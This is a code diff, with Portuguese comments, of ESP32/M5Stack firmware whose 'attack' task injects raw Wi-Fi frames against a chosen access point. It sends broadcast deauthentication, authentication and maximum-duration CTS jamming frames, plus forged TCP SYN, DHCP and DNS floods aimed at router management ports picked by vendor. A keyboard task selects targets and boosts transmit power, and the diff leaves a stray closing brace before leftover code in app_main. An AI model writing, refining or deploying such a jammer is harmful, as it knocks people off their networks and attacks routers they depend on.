@@ -389,23 +389,61 @@ void task_ataque(void *pvParameters) {
     const uint8_t common_gateways[][4] = {{192, 168, 0, 1}, {192, 168, 1, 1}, {192, 168, 15, 1}, {10, 0, 0, 1}, {172, 16, 0, 1}};
     const uint16_t portas_gerencia_genericas[] = {80, 443, 22, 7547}; 
     
-    const uint16_t reason_codes[] = { 0x0001, 0x0002, 0x0004, 0x0007, 0x0008 };
+const uint16_t reason_codes[] = { 0x0001, 0x0002, 0x0004, 0x0007, 0x0008 };
 
     bool config_radio_aplicada = false;
     uint32_t iteracao_yield = 0;
 
+    // [CORREÇÃO 3 E 4]: Cache de configurações do alvo e DNS estático
+    int alvo_configurado = -1;
+    FabricanteCPE fabricante = FABRICANTE_GENERICO;
+    uint16_t porta_alvo = 80;
+    
+    uint8_t dns_query_base[] = {
+        0x00, 0x00, // Bytes 0 e 1: Transaction ID (serão alterados no laço)
+        0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+        0x06, 'g', 'o', 'o', 'g', 'l', 'e', 0x03, 'c', 'o', 'm', 0x00, 
+        0x00, 0x01, 0x00, 0x01  
+    };
+
     while (true) {
         if (estado_atual.load() == ESTADO_ATIRAR && !alvo_perdido.load() && !scanner_pausa_ataque.load()) {
             
-            if (!config_radio_aplicada || flag_update_config.load()) {
+           if (!config_radio_aplicada || flag_update_config.load()) {
                 esp_wifi_set_max_tx_power(tx_power_max.load() ? 80 : 40); 
                 esp_wifi_set_channel(canal_atual_alvo.load(), WIFI_SECOND_CHAN_NONE);
                 config_radio_aplicada = true; flag_update_config.store(false);
+                
+                // [CORREÇÃO 1 E 3]: Faz o setup pesado apenas uma vez por alvo
+                if (alvo_configurado != alvo_selecionado) {
+                    alvo_configurado = alvo_selecionado;
+                    uint8_t* mac_alvo = alvos_encontrados[alvo_selecionado].bssid;
+                    
+                    fabricante = identificar_fabricante(mac_alvo);
+                    if (fabricante == FABRICANTE_MIKROTIK) porta_alvo = (fast_rand() % 2 == 0) ? 8291 : 80;
+                    else if (fabricante == FABRICANTE_HUAWEI || fabricante == FABRICANTE_ZTE) porta_alvo = (fast_rand() % 2 == 0) ? 443 : 7547;
+                    else if (fabricante == FABRICANTE_TPLINK || fabricante == FABRICANTE_INTELBRAS) porta_alvo = (fast_rand() % 2 == 0) ? 80 : 8080;
+                    else porta_alvo = portas_gerencia_genericas[fast_rand() % 4];
+
+                    deauth->frame_control = 0x00C0; deauth->duration = 0; 
+                    memcpy(deauth->mac_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
+                    memcpy(deauth->mac_src, mac_alvo, 6); memcpy(deauth->mac_bssid, mac_alvo, 6);
+
+                    auth->frame_control = 0x00B0; auth->duration = 0; auth->auth_algorithm = 0; auth->auth_seq = 1; auth->status_code = 0;
+                    memcpy(auth->mac_dest, mac_alvo, 6); memcpy(auth->mac_bssid, mac_alvo, 6);
+
+                    cts->frame_control = 0x00C4; cts->duration = 32767; memcpy(cts->mac_ra, mac_alvo, 6);
+
+                    pkt->mac.frame_control = 0x0108; pkt->mac.duration = 0;
+                    pkt->ip.version_ihl = 0x45; pkt->ip.ttl = 64; pkt->ip.tos = 0; 
+                }
             }
 
             uint8_t* mac_alvo = alvos_encontrados[alvo_selecionado].bssid;
             ModoAtaque modo = modo_ativo.load();
             EstrategiaAuto estrategia = estrategia_atual.load();
+            
+            // Variáveis booleanas de atirar_l2, etc... se mantêm iguais.
 
             deauth->frame_control = 0x00C0; deauth->duration = 0; 
             deauth->reason_code = reason_codes[fast_rand() % 5];
@@ -476,10 +514,9 @@ void task_ataque(void *pvParameters) {
                     
                     size_t t_injecao = 0;
                     
-                    if (is_tcp) {
+if (is_tcp) {
                         TcpHeader* tcp = (TcpHeader*)pkt->l4_and_payload;
                         size_t t_payload = 0; 
-
                         pkt->ip.protocol = 6; 
                         
                         int gw_idx = fast_rand() % 5;
@@ -487,28 +524,17 @@ void task_ataque(void *pvParameters) {
                         pkt->ip.ip_dest[2] = common_gateways[gw_idx][2]; pkt->ip.ip_dest[3] = common_gateways[gw_idx][3]; 
                         
                         tcp->src_port = htons(1024 + (fast_rand() % 60000)); 
-                        
-                        FabricanteCPE fabricante = identificar_fabricante(mac_alvo);
-                        uint16_t porta_alvo = 80;
-                        if (fabricante == FABRICANTE_MIKROTIK) porta_alvo = (fast_rand() % 2 == 0) ? 8291 : 80;
-                        else if (fabricante == FABRICANTE_HUAWEI || fabricante == FABRICANTE_ZTE) porta_alvo = (fast_rand() % 2 == 0) ? 443 : 7547;
-                        else if (fabricante == FABRICANTE_TPLINK || fabricante == FABRICANTE_INTELBRAS) porta_alvo = (fast_rand() % 2 == 0) ? 80 : 8080;
-                        else porta_alvo = portas_gerencia_genericas[fast_rand() % 4];
-                        
+                        // [CORREÇÃO 1]: Usa a porta calculada fora do laço
                         tcp->dest_port = htons(porta_alvo); 
                         tcp->seq_num = fast_rand(); tcp->ack_num = 0;
                         
-                        // [AUDITORIA FIX 5]: Adicionando 4 Bytes de Option MSS no pacote TCP SYN
-                        tcp->data_offset_res = (6 << 4); // Alterado de 5 para 6 (Header de 24 bytes)
+                        tcp->data_offset_res = (6 << 4); 
                         tcp->flags = 0x02; 
                         tcp->window_size = htons(5840); tcp->urgent_ptr = 0;
                         
                         uint8_t* tcp_options = pkt->l4_and_payload + sizeof(TcpHeader);
-                        tcp_options[0] = 0x02; // Option Kind: MSS
-                        tcp_options[1] = 0x04; // Option Length: 4
-                        tcp_options[2] = 0x05; // Option Value: 1460 (0x05B4)
-                        tcp_options[3] = 0xB4;
-                        t_payload = 4; // Contabiliza os 4 bytes do Option MSS como payload para o checksum
+                        tcp_options[0] = 0x02; tcp_options[1] = 0x04; tcp_options[2] = 0x05; tcp_options[3] = 0xB4;
+                        t_payload = 4; 
                         
                         t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(TcpHeader) + t_payload;
                         pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(TcpHeader) + t_payload);
@@ -525,15 +551,16 @@ void task_ataque(void *pvParameters) {
                         pkt->ip.ip_dest[0] = 255; pkt->ip.ip_dest[1] = 255; pkt->ip.ip_dest[2] = 255; pkt->ip.ip_dest[3] = 255; 
                         udp->src_port = htons(68); udp->dest_port = htons(67); 
                         
-                        memset(payload, 0, 248); 
+                        // [CORREÇÃO 6]: Removemos o memset para economizar ciclos, escrevendo direto no buffer DMA
                         payload[0] = 0x01; payload[1] = 0x01; payload[2] = 0x06; payload[3] = 0x00; 
-                        payload[4] = fast_rand() & 0xFF; 
-                        payload[5] = fast_rand() & 0xFF; 
-                        payload[6] = fast_rand() & 0xFF; 
-                        payload[7] = fast_rand() & 0xFF;
-                        for(int m = 0; m < 6; m++) payload[28 + m] = fast_rand() & 0xFF; 
-                        payload[236] = 0x63; payload[237] = 0x82; payload[238] = 0x53; payload[239] = 0x63;
+                        payload[4] = fast_rand() & 0xFF; payload[5] = fast_rand() & 0xFF; 
+                        payload[6] = fast_rand() & 0xFF; payload[7] = fast_rand() & 0xFF;
                         
+                        // Preenche apenas a área necessária
+                        for(int m = 8; m < 236; m++) payload[m] = 0; // Zera manualmente o miolo rapidamente
+                        for(int m = 0; m < 6; m++) payload[28 + m] = fast_rand() & 0xFF; 
+                        
+                        payload[236] = 0x63; payload[237] = 0x82; payload[238] = 0x53; payload[239] = 0x63;
                         payload[240] = 53; payload[241] = 1; payload[242] = 1;    
                         payload[243] = 55; payload[244] = 2; payload[245] = 1; payload[246] = 3; payload[247] = 255; 
                         
@@ -552,23 +579,14 @@ void task_ataque(void *pvParameters) {
                         UdpHeader* udp = (UdpHeader*)pkt->l4_and_payload;
                         uint8_t* payload = pkt->l4_and_payload + sizeof(UdpHeader);
                         
-                        uint8_t dns_query[] = {
-                            (uint8_t)(fast_rand() & 0xFF), (uint8_t)(fast_rand() & 0xFF), 
-                            0x01, 0x00, 
-                            0x00, 0x01, 
-                            0x00, 0x00, 
-                            0x00, 0x00, 
-                            0x00, 0x00, 
-                            0x06, 'g', 'o', 'o', 'g', 'l', 'e', 0x03, 'c', 'o', 'm', 0x00, 
-                            0x00, 0x01,  
-                            0x00, 0x01  
-                        };
-                        size_t t_payload = sizeof(dns_query);
-                        memcpy(payload, dns_query, t_payload);
+                        // [CORREÇÃO 4]: Copia do array global pré-alocado e só randomiza a transação
+                        size_t t_payload = sizeof(dns_query_base);
+                        memcpy(payload, dns_query_base, t_payload);
+                        payload[0] = (uint8_t)(fast_rand() & 0xFF); 
+                        payload[1] = (uint8_t)(fast_rand() & 0xFF);
 
                         pkt->ip.protocol = 17; 
                         
-                        // CORREÇÃO 2.4: Roteamento inteligente para forçar processamento pelo dnsmasq local do equipamento alvo
                         int gw_idx = fast_rand() % 5;
                         pkt->ip.ip_dest[0] = common_gateways[gw_idx][0]; pkt->ip.ip_dest[1] = common_gateways[gw_idx][1]; 
                         pkt->ip.ip_dest[2] = common_gateways[gw_idx][2]; pkt->ip.ip_dest[3] = common_gateways[gw_idx][3];
@@ -608,10 +626,60 @@ void task_ataque(void *pvParameters) {
 // 7. ENTRADA PRINCIPAL E CONTROLES (APP MAIN)
 // ===================================================================
 
+void task_controles(void *pvParameters) {
+    while (true) {
+        M5.update(); 
+        
+        if (M5.Keyboard.isKeyPressed('A') || M5.Keyboard.isKeyPressed('a')) modo_ativo.store(MODO_AUTOMATICO);
+        if (M5.Keyboard.isKeyPressed('1')) modo_ativo.store(MODO_MANUAL_L2);
+        if (M5.Keyboard.isKeyPressed('2')) modo_ativo.store(MODO_MANUAL_L3);
+        if (M5.Keyboard.isKeyPressed('3')) modo_ativo.store(MODO_MANUAL_CTS);
+
+        if (estado_atual.load() == ESTADO_SELECIONAR) {
+            if (total_alvos > 0) {
+                if (M5.Keyboard.isKeyPressed(KEY_DOWN)) { alvo_selecionado = (alvo_selecionado + 1) % total_alvos; desenhar_menu(); vTaskDelay(pdMS_TO_TICKS(150)); }
+                if (M5.Keyboard.isKeyPressed(KEY_UP)) { alvo_selecionado = (alvo_selecionado - 1 + total_alvos) % total_alvos; desenhar_menu(); vTaskDelay(pdMS_TO_TICKS(150)); }
+            }
+            
+            if (M5.Keyboard.isKeyPressed(' ')) { 
+                if (!thermal_lock.load()) {
+                    tx_power_max_user.store(!tx_power_max_user.load()); 
+                    tx_power_max.store(tx_power_max_user.load()); 
+                    desenhar_menu(); 
+                }
+                vTaskDelay(pdMS_TO_TICKS(200)); 
+            }
+            
+            if (M5.Keyboard.isKeyPressed(KEY_ENTER)) {
+                if (total_alvos > 0) { 
+                    canal_atual_alvo.store(alvos_encontrados[alvo_selecionado].primary); 
+                    analisar_alvo_automaticamente(alvo_selecionado); modo_ativo.store(MODO_AUTOMATICO); 
+                    M5.Display.clear(); flag_update_config.store(true); estado_atual.store(ESTADO_ATIRAR); 
+                } else { escanear_redes(); desenhar_menu(); }
+                vTaskDelay(pdMS_TO_TICKS(300));
+            }
+        } 
+        else if (estado_atual.load() == ESTADO_ATIRAR) {
+            if (M5.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+                alvo_perdido.store(false); 
+                estado_atual.store(ESTADO_SELECIONAR); escanear_redes(); desenhar_menu(); vTaskDelay(pdMS_TO_TICKS(300));
+            }
+            if (M5.Keyboard.isKeyPressed(' ')) { 
+                if (!thermal_lock.load()) {
+                    tx_power_max_user.store(!tx_power_max_user.load()); 
+                    tx_power_max.store(tx_power_max_user.load()); 
+                    flag_update_config.store(true); 
+                }
+                vTaskDelay(pdMS_TO_TICKS(200)); 
+            }
+        }
+        vTaskDelay(pdMS_TO_TICKS(10)); 
+    }
+}
+
 extern "C" void app_main(void) {
     auto cfg = M5.config(); M5.begin(cfg); M5.Display.setRotation(1); M5.Display.setTextSize(1.5);
     
-    // CORREÇÃO 3.6: Inicialização segura e robusta da NVS (Memory Wipe em caso de corrupção)
     esp_err_t ret = nvs_flash_init();
     if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
         ESP_ERROR_CHECK(nvs_flash_erase());
@@ -629,11 +697,14 @@ extern "C" void app_main(void) {
     temperature_sensor_config_t ts_cfg = TEMPERATURE_SENSOR_CONFIG_DEFAULT(20, 100);
     if (temperature_sensor_install(&ts_cfg, &temp_sensor) == ESP_OK) temperature_sensor_enable(temp_sensor);
 
-    xTaskCreatePinnedToCore(task_ataque, "ataque", 4096, NULL, 10, NULL, 0); 
-    xTaskCreatePinnedToCore(task_monitoramento, "monitor", 4096, NULL, 1, NULL, 1); 
-    xTaskCreatePinnedToCore(task_display, "display", 4096, NULL, 1, NULL, 1); 
+    // [CORREÇÃO 5]: Tasks devidamente distribuídas entre os Cores
+    xTaskCreatePinnedToCore(task_ataque, "ataque", 4096, NULL, 10, NULL, 0);       // Rádio Bare-Metal no Core 0
+    xTaskCreatePinnedToCore(task_monitoramento, "monitor", 4096, NULL, 1, NULL, 1); // Monitor no Core 1
+    xTaskCreatePinnedToCore(task_display, "display", 4096, NULL, 1, NULL, 1);       // Display no Core 1
+    xTaskCreatePinnedToCore(task_controles, "controles", 4096, NULL, 5, NULL, 1);   // Teclado/I2C no Core 1 com prioridade média
 
     escanear_redes(); desenhar_menu();
+}
 
     while (true) {
         M5.update(); 
